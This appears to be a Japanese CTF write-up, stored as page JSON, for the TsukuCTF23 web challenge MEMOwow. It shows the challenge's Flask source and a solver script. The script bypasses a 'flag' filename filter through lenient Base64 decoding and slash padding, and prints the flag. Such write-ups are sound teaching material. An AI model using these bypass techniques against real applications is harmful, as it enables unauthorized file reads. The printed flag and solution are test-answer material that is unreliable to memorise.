{"pageProps":{"postData":{"id":"MEMOwow","contentHtml":"# MEMOwow\n\n## 問題文\n\n素晴らしいメモアプリを作ったよ。\\\n覚える情報量が増えているって???\n\n<http://133.130.100.34:31415>\n\nHint\\\nwow\n\n## 難易度\n\n**medium**\n\n## 作問にあたって\n\nBase64でエンコードすると攻撃文字列になるXSSなど作りたいなと思っていました(無理)。\\\n仕方がないので文字列/flagがBase64で作れることを利用して問題にしました。\\\nもう少し自然なメモアプリにもできましたが、直前の作問で非想定解が怖いため変なメモアプリにしました。\\\nBase64をPythonで扱う際には、`validate=True`にしましょう。\n\n## 解法\n\nURLとソースコードが渡される。\\\n![site1.png](images/site1.png)\\\nアクセスするとメモを保存できるサイトのようだ。\\\n![site2.png](images/site2.png)\\\nメモを送信すると、メモIDが表示される。\\\n![site3.png](images/site3.png)\\\nbase64されていそうなので、デコードしてみる。\n\n```bash\n$ echo -n 'U2F0b2tpKOODuzPjg7spdg==' | base64 -d\nSatoki(・3・)v\n```\n\nなんとbase64されているものがメモIDになっているようだ(覚える情報量がメモより増えている)。\\\nメモの読み取りはこのメモIDを用いるようだ。\\\n![site4.png](images/site4.png)\\\n![site5.png](images/site5.png)\\\nソースを読むと実装は以下のようになっている。\n\n```python\n~~~\n@app.route(\"/\", methods=[\"GET\"])\ndef index():\n    if not \"memo\" in session:\n        session[\"memo\"] = [b\"Tsukushi\"]\n    return render_template(\"index.html\")\n\n\n@app.route(\"/write\", methods=[\"GET\"])\ndef write_get():\n    if not \"memo\" in session:\n        return redirect(url_for(\"index\"))\n    return render_template(\"write_get.html\")\n\n\n@app.route(\"/read\", methods=[\"GET\"])\ndef read_get():\n    if not \"memo\" in session:\n        return redirect(url_for(\"index\"))\n    return render_template(\"read_get.html\")\n\n\n@app.route(\"/write\", methods=[\"POST\"])\ndef write_post():\n    if not \"memo\" in session:\n        return redirect(url_for(\"index\"))\n    memo = urllib.parse.unquote_to_bytes(request.get_data()[8:256])\n    if len(memo) < 8:\n        return abort(403, \"これくらいの長さは記憶してください。👻\")\n    try:\n        session[\"memo\"].append(memo)\n        if len(session[\"memo\"]) > 5:\n            session[\"memo\"].pop(0)\n        session.modified = True\n        filename = base64.b64encode(memo).decode()\n        with open(f\"./memo/{filename}\", \"wb+\") as f:\n            f.write(memo)\n    except:\n        return abort(403, \"エラーが発生しました。👻\")\n    return render_template(\"write_post.html\", id=filename)\n\n\n@app.route(\"/read\", methods=[\"POST\"])\ndef read_post():\n    if not \"memo\" in session:\n        return redirect(url_for(\"index\"))\n    filename = urllib.parse.unquote_to_bytes(request.get_data()[7:]).replace(b\"=\", b\"\")\n    filename = filename + b\"=\" * (-len(filename) % 4)\n    if (\n        (b\".\" in filename.lower())\n        or (b\"flag\" in filename.lower())\n        or (len(filename) < 8 * 1.33)\n    ):\n        return abort(403, \"不正なメモIDです。👻\")\n    try:\n        filename = base64.b64decode(filename)\n        if filename not in session[\"memo\"]:\n            return abort(403, \"メモが見つかりません。👻\")\n        filename = base64.b64encode(filename).decode()\n        with open(f\"./memo/{filename}\", \"rb\") as f:\n            memo = f.read()\n    except:\n        return abort(403, \"エラーが発生しました。👻\")\n    return render_template(\"read_post.html\", id=filename, memo=memo.decode())\n~~~\n```\n\n`/write`ではなぜか`request.get_data()[8:256]`でメモを取得し、8文字以上であることをチェックした後に`session[\"memo\"]`に追加している。\\\nさらに、メモをbase64エンコードしたものをファイル名にし、メモをファイルとして保存している。\\\nそのファイル名をメモIDとしてユーザに返している。\\\n`/read`ではメモIDを受け取り、base64デコードした結果が`session[\"memo\"]`に入っている場合(自分で作成したメモである場合)のみメモIDをファイル名としてファイルを読み取っている。\\\nただし、`.`や`flag`でパストラバーサルやフラグの読み取りはできないようになっている。\\\nDockerfileを見ると、読み込み専用で`/var/www/memo/flag`にフラグが書かれているようだ。\n\n```Dockerfile\nFROM ubuntu:22.04\n\nENV DEBIAN_FRONTEND noninteractive\n\nRUN apt-get -y update --fix-missing && apt-get -y upgrade\nRUN apt-get -y install python3 python3-pip\n\nRUN mkdir /var/www\nWORKDIR /var/www\nCOPY ./ ./\n\nRUN pip3 install -r requirements.txt\n\nENV LANG C.UTF-8\n\nRUN chmod 755 -R /var/www\nRUN chmod 777 -R /var/www/memo\nRUN chmod 644 /var/www/memo/flag\nRUN chmod 644 /var/www/memo/VHN1a3VzaGk=\nRUN adduser -u 1000 memowow\nUSER memowow\n\nCMD [\"uwsgi\", \"--ini\", \"/var/www/uwsgi.ini\"]\n```\n\nまずは`session[\"memo\"]`のチェックを無視して、`/var/www/memo/flag`を読み取ることを考える。\\\n`.`と`flag`を使わずに`flag`ファイルを指定できないかと考えると、一度デコードした後に再度エンコードしていることに気づく。\\\n入力されたファイル名を使えばよいのに不自然だ(メモアプリ全体が不自然だが)。\\\n文字列`flag`を含んでいないが、デコードして再度エンコードして`flag`となる入力はないだろうか？\n\n```bash\n$ python\n~~~\n>>> import base64\n>>> base64.b64decode(\"flag\")\nb'~V\\xa0'\n>>> base64.b64decode(\"fla@g\")\nb'~V\\xa0'\nbase64.b64encode(base64.b64decode(\"fla@g\"))\nb'flag'\n```\n\n試すと`fla@g`などbase64に関連しない文字は無視されるようだ。\\\nこれで`flag`ファイルを読み取り先として指定できるが、`session[\"memo\"]`の問題がある。\\\nbase64エンコードした結果がファイル名、つまり`flag`となる必要があるので、文字列`flag`をデコードしたバイト列をメモとして与えてやればよい。\\\n書き込みは禁止されているので`/var/www/memo/flag`は書き換えられないが`session[\"memo\"]`には追加される。\\\nこれで`flag`ファイルを読み取れるかと思うが、メモには8文字以上の制限がある。\n\n```bash\n>>> base64.b64decode(\"flag\")\nb'~V\\xa0'\nlen(base64.b64decode(\"flag\"))\n3\n```\n\nソースコードをもう一度読むと`with open(f\"./memo/{filename}\", \"rb\") as f:`となっている。\\\n`open`は`/`がいくつあってもよいので、複数つけて8文字以上となるものにすればよい。\\\n`Incorrect padding`に注意する。\n\n```bash\n>>> base64.b64decode(\"////////flag\")\nb'\\xff\\xff\\xff\\xff\\xff\\xff~V\\xa0'\n>>> len(base64.b64decode(\"////////flag\"))\n9\n```\n\n必然的に読み取るファイルも`////////flag`と指定する。\\\n以下のsolver.pyで行う。\n\n```python\nimport re\nimport base64\nimport requests\n\nURL = \"http://133.130.100.34:31415/\"\n\nsession = requests.Session()\n\nsession.get(f\"{URL}\")\n\nres = session.post(f\"{URL}/write\", data={\"content\": base64.b64decode(b\"////////flag\")})\nprint(f\"[POST] /write: {res.status_code}\")\n\nres = session.post(f\"{URL}/read\", data={\"memoid\": \"////////fla@g\"})\nprint(f\"[POST] /read: {res.status_code}\")\nflag = re.search(\"TsukuCTF23{.*?}\", res.text)\nprint(f\"[FLAG] {flag.group()}\")\n```\n\n実行する。\n\n```bash\n$ python solver.py\n[POST] /write: 403\n[POST] /read: 200\n[FLAG] TsukuCTF23{b45364_50m371m35_3xh1b175_my573r10u5_b3h4v10r}\n```\n\nflagが得られた。\n\n## TsukuCTF23{b45364\\_50m371m35\\_3xh1b175\\_my573r10u5\\_b3h4v10r}\n","title":"MEMOwow","description":"Base64を用いたバイパス","author":"satoki00","genre":"web","solver":21,"point":496}},"__N_SSG":true}